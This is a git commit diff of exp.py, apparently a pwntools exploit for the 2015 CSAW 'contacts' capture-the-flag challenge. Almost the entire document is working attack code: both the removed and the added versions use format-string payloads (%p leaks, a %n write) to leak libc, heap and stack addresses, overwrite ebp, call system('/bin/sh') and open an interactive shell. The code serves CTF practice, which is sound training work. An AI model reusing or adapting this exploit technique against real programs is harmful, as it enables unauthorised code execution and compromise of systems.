4986c3926389e78a548de2cef917938c9e6ed3d5
wangzh0ng <ledong429@gmail.com>
2018-11-03 02:30:30 +0800

    Update exp.py

--- pwn/fmtstr/2015-CSAW-contacts/exp.py
+++ pwn/fmtstr/2015-CSAW-contacts/exp.py
@@ -1,76 +1,49 @@
 from pwn import *
-from LibcSearcher import *
-contact = ELF('./contacts')
-#context.log_level = 'debug'
-if args['REMOTE']:
-    sh = remote(11, 111)
-else:
-    sh = process('./contacts')
+context.log_level='info'
+context.arch='x86'
 
+p = process('contacts')
+bin = ELF('contacts')
+libc = bin.libc
+#gdb.attach(p,"b *0x08048C22\nb *0x080487D1\nc\n")#b *0x08048C22\nb* 0x08048CAB\n
+p.sendlineafter('>>>',"1")
+p.sendlineafter('Name:',"dd")
+p.sendlineafter('No:',"ee")
+p.sendlineafter('Length of description:',"100")
+p.sendlineafter('Enter description:',"%1$p%2$p%18$p")
+p.sendlineafter('>>>',"4")
+p.recvuntil("0x")
+des_heap = int(p.recv(7),16)+0x10-2+22-4-4
+print 'heap:',hex(des_heap)
+p.recvuntil("0x")
+puts = int(p.recv(8),16)-11
+print 'libc puts old address :',hex(libc.sym['puts'] )
 
-def createcontact(name, phone, descrip_len, description):
-    sh.recvuntil('>>> ')
-    sh.sendline('1')
-    sh.recvuntil('Contact info: \n')
-    sh.recvuntil('Name: ')
-    sh.sendline(name)
-    sh.recvuntil('You have 10 numbers\n')
-    sh.sendline(phone)
-    sh.recvuntil('Length of description: ')
-    sh.sendline(descrip_len)
-    sh.recvuntil('description:\n\t\t')
-    sh.sendline(description)
+p.recvuntil("0x")
+ebp = int(p.recv(8),16)
+print 'stack ret ebp address :',hex(ebp)
 
+libc.address = puts - libc.sym['puts']
 
-def printcontact():
-    sh.recvuntil('>>> ')
-    sh.sendline('4')
-    sh.recvuntil('Contacts:')
-    sh.recvuntil('Description: ')
+print 'libc puts address :',hex(libc.sym['puts'] )
+binsh = next(libc.search('/bin/sh'))
+print 'libc /bin/sh address :',hex(binsh)
+print 'lib address :',hex(libc.address )
+print 'lib system address :',hex(libc.sym['system'] )
 
+#p.sendlineafter('>>>',"4")
 
-# get system addr & binsh_addr
-payload = '%31$paaaa'
-createcontact('1111', '1111', '111', payload)
-printcontact()
-libc_start_main_ret = int(sh.recvuntil('aaaa', drop=True), 16)
-log.success('get libc_start_main_ret addr: ' + hex(libc_start_main_ret))
-libc = LibcSearcher('__libc_start_main_ret', libc_start_main_ret)
-libc_base = libc_start_main_ret - libc.dump('__libc_start_main_ret')
-system_addr = libc_base + libc.dump('system')
-binsh_addr = libc_base + libc.dump('str_bin_sh')
-log.success('get system addr: ' + hex(system_addr))
-log.success('get binsh addr: ' + hex(binsh_addr))
-#gdb.attach(sh)
+p.sendlineafter('>>>',"3")
+p.sendlineafter('change?',"dd")
+p.sendlineafter('>>>',"1")
+p.sendlineafter('New name',"a"*20)
 
-# get heap addr and ebp addr
-payload = flat([
-    system_addr,
-    'bbbb',
-    binsh_addr,
-    '%6$p%11$pcccc',
-])
-createcontact('2222', '2222', '222', payload)
-printcontact()
-sh.recvuntil('Description: ')
-data = sh.recvuntil('cccc', drop=True)
-data = data.split('0x')
-print data
-ebp_addr = int(data[1], 16)
-heap_addr = int(data[2], 16)
+p.sendlineafter('>>>',"3")
+p.sendlineafter('change?',"a"*20)
+p.sendlineafter('>>>',"2")
+p.sendlineafter('Length of description:',"100")
 
-# modify ebp
-part1 = (heap_addr - 4) / 2
-part2 = heap_addr - 4 - part1
-payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'
-#print payload
-createcontact('3333', '123456789', '300', payload)
-printcontact()
-sh.recvuntil('Description: ')
-sh.recvuntil('Description: ')
-#gdb.attach(sh)
-print 'get shell'
-sh.recvuntil('>>> ')
-#get shell
-sh.sendline('5')
-sh.interactive()
+p.sendlineafter('Description:',"%"+str(des_heap)+"c%06$n"+p32(libc.sym['system'])+"aaaa"+p32(binsh)+'cccc')
+p.sendlineafter('>>>',"4")
+p.sendlineafter('>>>',"5")
+p.interactive()
